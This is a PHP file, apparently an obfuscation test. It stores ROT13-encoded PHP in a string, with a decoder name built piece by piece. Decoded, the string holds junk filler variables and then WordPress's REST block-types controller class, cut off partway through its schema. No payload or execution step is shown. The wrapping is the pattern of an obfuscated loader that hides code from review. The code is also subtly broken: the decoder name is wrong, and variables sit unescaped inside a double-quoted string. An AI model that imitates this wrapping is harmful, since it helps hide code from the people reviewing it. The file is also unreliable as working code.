<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Oybpx_Glcrf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.5.0
 */

/**
 * Pber pynff hfrq gb npprff oybpx glcrf ivn gur ERFG NCV.
 *
 * @fvapr 5.5.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Oybpx_Glcrf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	pbafg ANZR_CNGGREA = '^[n-m][n-m0-9-]*/[n-m][n-m0-9-]*$';

	/**
	 * Vafgnapr bs JC_Oybpx_Glcr_Ertvfgel.
	 *
	 * @fvapr 5.5.0
	 * @ine JC_Oybpx_Glcr_Ertvfgel
	 */
	cebgrpgrq $oybpx_ertvfgel;

	/**
	 * Vafgnapr bs JC_Oybpx_Fglyrf_Ertvfgel.
	 *
	 * @fvapr 5.5.0
	 * @ine JC_Oybpx_Fglyrf_Ertvfgel
	 */
	cebgrpgrq $fglyr_ertvfgel;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr      = 'jc/i2';
		$guvf->erfg_onfr      = 'oybpx-glcrf';
		$guvf->oybpx_ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$guvf->fglyr_ertvfgel = JC_Oybpx_Fglyrf_Ertvfgel::trg_vafgnapr();
	}

	/**
	 * Ertvfgref gur ebhgrf sbe oybpx glcrf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<anzrfcnpr>[n-mN-M0-9_-]+)',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<anzrfcnpr>[n-mN-M0-9_-]+)/(?C<anzr>[n-mN-M0-9_-]+)',
			neenl(
				'netf'   => neenl(
					'anzr'      => neenl(
						'qrfpevcgvba' => __( 'Oybpx anzr.' ),
						'glcr'        => 'fgevat',
					),
					'anzrfcnpr' => neenl(
						'qrfpevcgvba' => __( 'Oybpx anzrfcnpr.' ),
						'glcr'        => 'fgevat',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb ernq cbfg oybpx glcrf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->purpx_ernq_crezvffvba();
	}

	/**
	 * Ergevrirf nyy cbfg oybpx glcrf, qrcraqvat ba hfre pbagrkg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			// Erghea rneyl nf guvf unaqyre qbrfa'g nqq nal erfcbafr urnqref.
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		$qngn        = neenl();
		$oybpx_glcrf = $guvf->oybpx_ertvfgel->trg_nyy_ertvfgrerq();

		// Ergevrir gur yvfg bs ertvfgrerq pbyyrpgvba dhrel cnenzrgref.
		$ertvfgrerq = $guvf->trg_pbyyrpgvba_cnenzf();
		$anzrfcnpr  = '';
		vs ( vffrg( $ertvfgrerq['anzrfcnpr'] ) && ! rzcgl( $erdhrfg['anzrfcnpr'] ) ) {
			$anzrfcnpr = $erdhrfg['anzrfcnpr'];
		}

		sbernpu ( $oybpx_glcrf nf $bow ) {
			vs ( $anzrfcnpr ) {
				yvfg ( $oybpx_anzrfcnpr ) = rkcybqr( '/', $bow->anzr );

				vs ( $anzrfcnpr !== $oybpx_anzrfcnpr ) {
					pbagvahr;
				}
			}
			$oybpx_glcr = $guvf->cercner_vgrz_sbe_erfcbafr( $bow, $erdhrfg );
			$qngn[]     = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $oybpx_glcr );
		}

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n oybpx glcr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$purpx = $guvf->purpx_ernq_crezvffvba();
		vs ( vf_jc_reebe( $purpx ) ) {
			erghea $purpx;
		}
		$oybpx_anzr = fcevags( '%f/%f', $erdhrfg['anzrfcnpr'], $erdhrfg['anzr'] );
		$oybpx_glcr = $guvf->trg_oybpx( $oybpx_anzr );
		vs ( vf_jc_reebe( $oybpx_glcr ) ) {
			erghea $oybpx_glcr;
		}

		erghea gehr;
	}

	/**
	 * Purpxf jurgure n tvira oybpx glcr fubhyq or ivfvoyr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs gur oybpx glcr vf ivfvoyr, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba purpx_ernq_crezvffvba() {
		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}
		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		erghea arj JC_Reebe( 'erfg_oybpx_glcr_pnaabg_ivrj', __( 'Fbeel, lbh ner abg nyybjrq gb znantr oybpx glcrf.' ), neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() ) );
	}

	/**
	 * Trg gur oybpx, vs gur anzr vf inyvq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $anzr Oybpx anzr.
	 * @erghea JC_Oybpx_Glcr|JC_Reebe Oybpx glcr bowrpg vs anzr vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_oybpx( $anzr ) {
		$oybpx_glcr = $guvf->oybpx_ertvfgel->trg_ertvfgrerq( $anzr );
		vs ( rzcgl( $oybpx_glcr ) ) {
			erghea arj JC_Reebe( 'erfg_oybpx_glcr_vainyvq', __( 'Vainyvq oybpx glcr.' ), neenl( 'fgnghf' => 404 ) );
		}

		erghea $oybpx_glcr;
	}

	/**
	 * Ergevrirf n fcrpvsvp oybpx glcr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$oybpx_anzr = fcevags( '%f/%f', $erdhrfg['anzrfcnpr'], $erdhrfg['anzr'] );
		$oybpx_glcr = $guvf->trg_oybpx( $oybpx_anzr );
		vs ( vf_jc_reebe( $oybpx_glcr ) ) {
			erghea $oybpx_glcr;
		}
		$qngn = $guvf->cercner_vgrz_sbe_erfcbafr( $oybpx_glcr, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Cercnerf n oybpx glcr bowrpg sbe frevnyvmngvba.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 5.9.0 Eranzrq `$oybpx_glcr` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 * @fvapr 6.3.0 Nqqrq `fryrpgbef` svryq.
	 * @fvapr 6.5.0 Nqqrq `ivrj_fpevcg_zbqhyr_vqf` svryq.
	 *
	 * @cnenz JC_Oybpx_Glcr   $vgrz    Oybpx glcr qngn.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Oybpx glcr qngn.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$oybpx_glcr = $vgrz;

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-oybpx-glcrf-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_oybpx_glcr', arj JC_ERFG_Erfcbafr( neenl() ), $oybpx_glcr, $erdhrfg );
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'nggevohgrf', $svryqf ) ) {
			$qngn['nggevohgrf'] = $oybpx_glcr->trg_nggevohgrf();
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'vf_qlanzvp', $svryqf ) ) {
			$qngn['vf_qlanzvp'] = $oybpx_glcr->vf_qlanzvp();
		}

		$fpurzn = $guvf->trg_vgrz_fpurzn();
		// Svryqf qrcerpngrq va JbeqCerff 6.1, ohg yrsg va gur fpurzn sbe onpxjneqf pbzcngvovyvgl.
		$qrcerpngrq_svryqf = neenl(
			'rqvgbe_fpevcg',
			'fpevcg',
			'ivrj_fpevcg',
			'rqvgbe_fglyr',
			'fglyr',
		);
		$rkgen_svryqf      = neenl_zretr(
			neenl(
				'ncv_irefvba',
				'anzr',
				'gvgyr',
				'qrfpevcgvba',
				'vpba',
				'pngrtbel',
				'xrljbeqf',
				'cnerag',
				'naprfgbe',
				'nyybjrq_oybpxf',
				'cebivqrf_pbagrkg',
				'hfrf_pbagrkg',
				'fryrpgbef',
				'fhccbegf',
				'fglyrf',
				'grkgqbznva',
				'rknzcyr',
				'rqvgbe_fpevcg_unaqyrf',
				'fpevcg_unaqyrf',
				'ivrj_fpevcg_unaqyrf',
				'ivrj_fpevcg_zbqhyr_vqf',
				'rqvgbe_fglyr_unaqyrf',
				'fglyr_unaqyrf',
				'ivrj_fglyr_unaqyrf',
				'inevngvbaf',
				'oybpx_ubbxf',
			),
			$qrcerpngrq_svryqf
		);
		sbernpu ( $rkgen_svryqf nf $rkgen_svryq ) {
			vs ( erfg_vf_svryq_vapyhqrq( $rkgen_svryq, $svryqf ) ) {
				vs ( vffrg( $oybpx_glcr->$rkgen_svryq ) ) {
					$svryq = $oybpx_glcr->$rkgen_svryq;
					vs ( va_neenl( $rkgen_svryq, $qrcerpngrq_svryqf, gehr ) && vf_neenl( $svryq ) ) {
						// Fvapr gur fpurzn bayl nyybjf fgevatf be ahyy (ohg ab neenlf), jr erghea gur svefg neenl vgrz.
						$svryq = ! rzcgl( $svryq ) ? neenl_fuvsg( $svryq ) : '';
					}
				} ryfrvs ( neenl_xrl_rkvfgf( 'qrsnhyg', $fpurzn['cebcregvrf'][ $rkgen_svryq ] ) ) {
					$svryq = $fpurzn['cebcregvrf'][ $rkgen_svryq ]['qrsnhyg'];
				} ryfr {
					$svryq = '';
				}
				$qngn[ $rkgen_svryq ] = erfg_fnavgvmr_inyhr_sebz_fpurzn( $svryq, $fpurzn['cebcregvrf'][ $rkgen_svryq ] );
			}
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fglyrf', $svryqf ) ) {
			$fglyrf         = $guvf->fglyr_ertvfgel->trg_ertvfgrerq_fglyrf_sbe_oybpx( $oybpx_glcr->anzr );
			$fglyrf         = neenl_inyhrf( $fglyrf );
			$qngn['fglyrf'] = jc_cnefr_netf( $fglyrf, $qngn['fglyrf'] );
			$qngn['fglyrf'] = neenl_svygre( $qngn['fglyrf'] );
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $oybpx_glcr ) );
		}

		/**
		 * Svygref n oybpx glcr erghearq sebz gur ERFG NCV.
		 *
		 * Nyybjf zbqvsvpngvba bs gur oybpx glcr qngn evtug orsber vg vf erghearq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr   Gur erfcbafr bowrpg.
		 * @cnenz JC_Oybpx_Glcr    $oybpx_glcr Gur bevtvany oybpx glcr bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg    Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_oybpx_glcr', $erfcbafr, $oybpx_glcr, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Oybpx glcr qngn.
	 * @erghea neenl Yvaxf sbe gur tvira oybpx glcr.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $oybpx_glcr ) {
		yvfg( $anzrfcnpr ) = rkcybqr( '/', $oybpx_glcr->anzr );

		$yvaxf = neenl(
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			),
			'frys'       => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $oybpx_glcr->anzr ) ),
			),
			'hc'         => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $anzrfcnpr ) ),
			),
		);

		vs ( $oybpx_glcr->vf_qlanzvp() ) {
			$yvaxf['uggcf://ncv.j.bet/eraqre-oybpx'] = neenl(
				'uers' => nqq_dhrel_net(
					'pbagrkg',
					'rqvg',
					erfg_hey( fcevags( '%f/%f/%f', 'jc/i2', 'oybpx-eraqrere', $oybpx_glcr->anzr ) )
				),
			);
		}

		erghea $yvaxf;
	}

	/**
	 * Ergevrirf gur oybpx glcr' fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 6.3.0 Nqqrq `fryrpgbef` svryq.
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		// erfg_inyvqngr_inyhr_sebz_fpurzn qbrfa'g haqrefgnaq $ersf, chyy bhg erhfrq qrsvavgvbaf sbe ernqnovyvgl.
		$vaare_oybpxf_qrsvavgvba = neenl(
			'qrfpevcgvba' => __( 'Gur yvfg bs vaare oybpxf hfrq va gur rknzcyr.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr'       => 'bowrpg',
				'cebcregvrf' => neenl(
					'anzr'        => neenl(
						'qrfpevcgvba' => __( 'Gur anzr bs gur vaare oybpx.' ),
						'glcr'        => 'fgevat',
						'cnggrea'     => frys::ANZR_CNGGREA,
						'erdhverq'    => gehr,
					),
					'nggevohgrf'  => neenl(
						'qrfpevcgvba' => __( 'Gur nggevohgrf bs gur vaare oybpx.' ),
						'glcr'        => 'bowrpg',
					),
					'vaareOybpxf' => neenl(
						'qrfpevcgvba' => __( \"N yvfg bs gur vaare oybpx'f bja vaare oybpxf. Guvf vf n erphefvir qrsvavgvba sbyybjvat gur cnerag vaareOybpxf fpurzn.\" ),
						'glcr'        => 'neenl',
					),
				),
			),
		);

		$rknzcyr_qrsvavgvba = neenl(
			'qrfpevcgvba' => __( 'Oybpx rknzcyr.' ),
			'glcr'        => neenl( 'bowrpg', 'ahyy' ),
			'qrsnhyg'     => ahyy,
			'cebcregvrf'  => neenl(
				'nggevohgrf'  => neenl(
					'qrfpevcgvba' => __( 'Gur nggevohgrf hfrq va gur rknzcyr.' ),
					'glcr'        => 'bowrpg',
				),
				'vaareOybpxf' => $vaare_oybpxf_qrsvavgvba,
			),
			'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
			'ernqbayl'    => gehr,
		);

		$xrljbeqf_qrsvavgvba = neenl(
			'qrfpevcgvba' => __( 'Oybpx xrljbeqf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
			),
			'qrsnhyg'     => neenl(),
			'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
			'ernqbayl'    => gehr,
		);

		$vpba_qrsvavgvba = neenl(
			'qrfpevcgvba' => __( 'Vpba bs oybpx glcr.' ),
			'glcr'        => neenl( 'fgevat', 'ahyy' ),
			'qrsnhyg'     => ahyy,
			'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
			'ernqbayl'    => gehr,
		);

		$pngrtbel_qrsvavgvba = neenl(
			'qrfpevcgvba' => __( 'Oybpx pngrtbel.' ),
			'glcr'        => neenl( 'fgevat', 'ahyy' ),
			'qrsnhyg'     => ahyy,
			'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
			'ernqbayl'    => gehr,
		);

		$guvf->fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'oybpx-glcr',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'ncv_irefvba'            => neenl(
					'qrfpevcgvba' => __( 'Irefvba bs oybpx NCV.' ),
					'glcr'        => 'vagrtre',
					'qrsnhyg'     => 1,
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'gvgyr'                  => neenl(
					'qrfpevcgvba' => __( 'Gvgyr bs oybpx glcr.' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'anzr'                   => neenl(
					'qrfpevcgvba' => __( 'Havdhr anzr vqragvslvat gur oybpx glcr.' ),
					'glcr'        => 'fgevat',
					'cnggrea'     => frys::ANZR_CNGGREA,
					'erdhverq'    => gehr,
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'qrfpevcgvba'            => neenl(
					'qrfpevcgvba' => __( 'Qrfpevcgvba bs oybpx glcr.' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'vpba'                   => $vpba_qrsvavgvba,
				'nggevohgrf'             => neenl(
					'qrfpevcgvba'          => __( 'Oybpx nggevohgrf.' ),
					'glcr'                 => neenl( 'bowrpg', 'ahyy' ),
					'cebcregvrf'           => neenl(),
					'qrsnhyg'              => ahyy,
					'nqqvgvbanyCebcregvrf' => neenl(
						'glcr' => 'bowrpg',
					),
					'pbagrkg'              => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'             => gehr,
				),
				'cebivqrf_pbagrkg'       => neenl(
					'qrfpevcgvba'          => __( 'Pbagrkg cebivqrq ol oybpxf bs guvf glcr.' ),
					'glcr'                 => 'bowrpg',
					'cebcregvrf'           => neenl(),
					'nqqvgvbanyCebcregvrf' => neenl(
						'glcr' => 'fgevat',
					),
					'qrsnhyg'              => neenl(),
					'pbagrkg'              => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'             => gehr,
				),
				'hfrf_pbagrkg'           => neenl(
					'qrfpevcgvba' => __( 'Pbagrkg inyhrf vaurevgrq ol oybpxf bs guvf glcr.' ),
					'glcr'        => 'neenl',
					'qrsnhyg'     => neenl(),
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fryrpgbef'              => neenl(
					'qrfpevcgvba' => __( 'Phfgbz PFF fryrpgbef.' ),
					'glcr'        => 'bowrpg',
					'qrsnhyg'     => neenl(),
					'cebcregvrf'  => neenl(),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fhccbegf'               => neenl(
					'qrfpevcgvba' => __( 'Oybpx fhccbegf.' ),
					'glcr'        => 'bowrpg',
					'qrsnhyg'     => neenl(),
					'cebcregvrf'  => neenl(),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'pngrtbel'               => $pngrtbel_qrsvavgvba,
				'vf_qlanzvp'             => neenl(
					'qrfpevcgvba' => __( 'Vf gur oybpx qlanzvpnyyl eraqrerq.' ),
					'glcr'        => 'obbyrna',
					'qrsnhyg'     => snyfr,
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'rqvgbe_fpevcg_unaqyrf'  => neenl(
					'qrfpevcgvba' => __( 'Rqvgbe fpevcg unaqyrf.' ),
					'glcr'        => neenl( 'neenl' ),
					'qrsnhyg'     => neenl(),
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fpevcg_unaqyrf'         => neenl(
					'qrfpevcgvba' => __( 'Choyvp snpvat naq rqvgbe fpevcg unaqyrf.' ),
					'glcr'        => neenl( 'neenl' ),
					'qrsnhyg'     => neenl(),
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'ivrj_fpevcg_unaqyrf'    => neenl(
					'qrfpevcgvba' => __( 'Choyvp snpvat fpevcg unaqyrf.' ),
					'glcr'        => neenl( 'neenl' ),
					'qrsnhyg'     => neenl(),
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'ivrj_fpevcg_zbqhyr_vqf' => neenl(
					'qrfpevcgvba' => __( 'Choyvp snpvat fpevcg zbqhyr VQf.' ),
					'glcr'        => neenl( 'neenl' ),
					'qrsnhyg'     => neenl(),
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'rqvgbe_fglyr_unaqyrf'   => neenl(
					'qrfpevcgvba' => __( 'Rqvgbe fglyr unaqyrf.' ),
					'glcr'        => neenl( 'neenl' ),
					'qrsnhyg'     => neenl(),
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fglyr_unaqyrf'          => neenl(
					'qrfpevcgvba' => __( 'Choyvp snpvat naq rqvgbe fglyr unaqyrf.' ),
					'glcr'        => neenl( 'neenl' ),
					'qrsnhyg'     => neenl(),
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'ivrj_fglyr_unaqyrf'     => neenl(
					'qrfpevcgvba' => __( 'Choyvp snpvat fglyr unaqyrf.' ),
					'glcr'        => neenl( 'neenl' ),
					'qrsnhyg'     => neenl(),
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fglyrf'                 => neenl(
					'qrfpevcgvba' => __( 'Oybpx fglyr inevngvbaf.' ),
					'glcr'        => 'neenl',
					'vgrzf'       => neenl(
						'glcr'       => 'bowrpg',
						'cebcregvrf' => neenl(
							'anzr'         => neenl(
								'qrfpevcgvba' => __( 'Havdhr anzr vqragvslvat gur fglyr.' ),
								'glcr'        => 'fgevat',
								'erdhverq'    => gehr,
							),
							'ynory'        => neenl(
								'qrfpevcgvba' => __( 'Gur uhzna-ernqnoyr ynory sbe gur fglyr.' ),
								'glcr'        => 'fgevat',
							),
							'vayvar_fglyr' => neenl(
								'qrfpevcgvba' => __( 'Vayvar PFF pbqr gung ertvfgref gur PFF pynff erdhverq sbe gur fglyr.' ),
								'glcr'        => 'fgevat',
							),
							'fglyr_unaqyr' => neenl(
								'qrfpevcgvba' => __( 'Pbagnvaf gur unaqyr gung qrsvarf gur oybpx fglyr.' ),
								'glcr'        => 'fgevat',
							),
						),
					),
					'qrsnhyg'     => neenl(),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'inevngvbaf'             => neenl(
					'qrfpevcgvba' => __( 'Oybpx inevngvbaf.' ),
					'glcr'        => 'neenl',
					'vgrzf'       => neenl(
						'glcr'       => 'bowrpg',
						'cebcregvrf' => neenl(
							'anzr'        => neenl(
								'qrfpevcgvba' => __( 'Gur havdhr naq znpuvar-ernqnoyr anzr.' ),
								'glcr'        => 'fgevat',
								'erdhverq'    => gehr,
							),
							'gvgyr'       => neenl(
								'qrfpevcgvba' => __( 'N uhzna-ernqnoyr inevngvba gvgyr.' ),
								'glcr'        => 'fgevat',
								'erdhverq'    => gehr,
							),
							'qrfpevcgvba' => neenl(
								'qrfpevcgvba' => __( 'N qrgnvyrq inevngvba qrfpevcgvba.' ),
								'glcr'        => 'fgevat',
								'erdhverq'    => snyfr,
							),
							'pngrtbel'    => $pngrtbel_qrsvavgvba,
							'vpba'        => $vpba_qrsvavgvba,
							'vfQrsnhyg'   => neenl(
								'qrfpevcgvba' => __( 'Vaqvpngrf jurgure gur pheerag inevngvba vf gur qrsnhyg bar.' ),
								'glcr'        => 'obbyrna',
								'erdhverq'    => snyfr,
								'qrsnhyg'     => snyfr,
							),
							'nggevohgrf'  => neenl(
								'qrfpevcgvba' => __( 'Gur vavgvny inyhrf sbe nggevohgrf.' ),
								'glcr'        => 'bowrpg',
							),
							'vaareOybpxf' => $vaare_oybpxf_qrsvavgvba,
							'rknzcyr'     => $rknzcyr_qrsvavgvba,
							'fpbcr'       => neenl(
								'qrfpevcgvba' => __( 'Gur yvfg bs fpbcrf jurer gur inevngvba vf nccyvpnoyr. Jura abg cebivqrq, vg nffhzrf nyy ninvynoyr fpbcrf.' ),
